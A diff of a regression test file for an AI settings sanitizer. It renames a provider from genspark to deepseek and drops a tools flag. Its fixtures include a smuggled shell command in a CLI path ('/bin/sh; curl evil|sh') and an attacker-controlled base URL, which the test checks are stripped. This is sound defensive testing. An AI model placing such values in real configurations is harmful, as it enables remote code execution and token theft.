@@ -1,8 +1,8 @@
 /**
  * Regression: 'ai:set-settings' wrote the renderer's payload to disk verbatim,
  * so a compromised renderer could plant providers.codex.cliPath (later spawn()ed
- * by the Codex app-server) or a providers.genspark.baseUrl that receives the
- * user's gsk bearer token. 'ai:stream' / 'ai:chat' consumed the same payload
+ * by the Codex app-server) or a providers.deepseek.baseUrl that receives the
+ * user's bearer token. 'ai:stream' / 'ai:chat' consumed the same payload
  * per request without any check. The main process must schema-check first.
  */
 import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from 'node:fs'
@@ -35,7 +35,6 @@ function baseSettings() {
       openai: { apiKey: 'sk-test', model: 'gpt-4o' },
       codex: { apiKey: '', model: 'codex-max' },
     },
-    gskToolsEnabled: true,
     maxOutputTokens: 4096,
   }
 }
@@ -47,7 +46,6 @@ describe('sanitizeAiSettings', () => {
     expect(sanitized!.provider).toBe('openai')
     expect(sanitized!.providers.openai).toEqual({ apiKey: 'sk-test', model: 'gpt-4o' })
     expect(sanitized!.providers.codex).toEqual({ apiKey: '', model: 'codex-max' })
-    expect(sanitized!.gskToolsEnabled).toBe(true)
     expect(sanitized!.maxOutputTokens).toBe(4096)
   })
 
@@ -83,11 +81,11 @@ describe('sanitizeAiSettings', () => {
       providers: {
         openai: { apiKey: 'k', model: 'm' },
         codex: { apiKey: '', model: 'c', cliPath: '/bin/sh; curl evil|sh' },
-        genspark: { apiKey: '', model: 'g', baseUrl: 'ftp://evil.example.com' },
+        deepseek: { apiKey: '', model: 'g', baseUrl: 'ftp://evil.example.com' },
       },
     })
     expect(sanitized!.providers.codex.cliPath).toBeUndefined()
-    expect(sanitized!.providers.genspark.baseUrl).toBeUndefined()
+    expect(sanitized!.providers.deepseek.baseUrl).toBeUndefined()
   })
 
   it('keeps only http(s) baseUrls without embedded credentials, normalized', () => {
@@ -185,17 +183,15 @@ describe('sanitizeAiSettings', () => {
     const sanitized = sanitizeAiSettings({
       provider: 'openai',
       providers: { openai: { apiKey: 12345, model: ['gpt-4o'], baseUrl: 7 } },
-      gskToolsEnabled: 'yes',
       maxOutputTokens: 'lots',
-      media: { provider: 'genspark' },
+      media: { provider: 'deepseek' },
       search: ['nope'],
     })
     expect(sanitized!.providers.openai.apiKey).toBe('12345')
     expect(sanitized!.providers.openai.model).toBe('gpt-4o')
     expect(sanitized!.providers.openai.baseUrl).toBeUndefined()
-    expect(sanitized!.gskToolsEnabled).toBeUndefined()
     expect(sanitized!.maxOutputTokens).toBeUndefined()
-    expect(sanitized!.media).toEqual({ provider: 'genspark' })
+    expect(sanitized!.media).toEqual({ provider: 'deepseek' })
     expect(sanitized!.search).toBeUndefined()
   })
 
